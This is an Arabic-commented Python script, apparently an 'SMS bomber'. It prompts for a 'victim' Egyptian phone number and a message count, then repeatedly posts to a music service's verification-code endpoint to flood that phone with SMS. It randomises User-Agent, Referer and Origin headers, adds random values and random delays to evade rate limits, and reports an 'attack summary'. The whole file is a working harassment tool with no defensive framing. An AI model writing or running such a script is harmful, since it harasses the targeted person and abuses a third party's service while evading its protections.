# تثبيت المكاتب الضرورية
try:
    import requests
    import json
    import time
    import sys
    import random
    import string
except ImportError as e:
    print(f"❌ خطأ في استيراد المكتبات: {e}")
    print("✅ برجاء تثبيت المكتبات باستخدام: pip install requests")
    exit()

# رابط API الخاص بالإرسال
url = "https://api.twistmena.com/music/Dlogin/sendCode"

# رسائل التنسيق
def print_separator():
    print("=" * 50)

def loading_message(message, delay=0.5):
    for char in message:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

# عنوان البداية
print_separator()
print("ماتريكس بن المنصوره بيمسي عليك⚡♥")
print_separator()

# إدخال رقم الهاتف
number = input(":حط رقم الضحيه يصديقي⚡♥")

# التحقق من صيغة الرقم
if number.startswith("01") and len(number) == 11:
    number = "2" + number  # إضافة كود الدولة لمصر
else:
    print("❌ الرقم غير صحيح. يجب أن يبدأ بـ 01 ويكون مكونًا من 11 رقمًا.")
    exit()

# إدخال عدد مرات الإرسال
sms_count = int(input("⚡😈 عدد الرسايل: "))

# تأكيد بدء الإرسال
print_separator()
loading_message(" كده الرسايل وصلت يصديقي⚡♥ ... ", delay=0.05)

# قائمة User-Agent متنوعة
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
]

referers = [
    "https://www.google.com",
    "https://www.bing.com",
]

origin_urls = [
    "https://www.example.com",
    "https://www.someotherdomain.com",
]

# دالة لتوليد الهيدر العشوائي
def get_headers():
    return {
        "User-Agent": random.choice(user_agents),
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Referer": random.choice(referers),
        "Origin": random.choice(origin_urls),
    }

# دالة لتوليد رقم عشوائي لإضافة بعض العشوائية
def random_string(length=6):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# دالة إرسال الطلبات
def send_request(number, sms_count):
    success_count = 0
    failure_count = 0

    for i in range(sms_count):
        payload = json.dumps({"dial": number, "randomValue": random_string()})
        headers = get_headers()
        try:
            response = requests.post(url, headers=headers, data=payload)
            if response.status_code == 200:
                print(f"✅ رسالة {i + 1} تم إرسالها بنجاح!")
                success_count += 1
            else:
                print(f"❌ رسالة {i + 1} فشلت. كود الاستجابة: {response.status_code}")
                failure_count += 1
        except Exception as e:
            print(f"❌ خطأ أثناء الإرسال: {e}")
            failure_count += 1
        time.sleep(random.uniform(1, 3))

    print_separator()
    print(f"📊 ملخص الهجوم: {success_count} نجاح - {failure_count} فشل.")
    print_separator()

# بدء التنفيذ
send_request(number, sms_count)
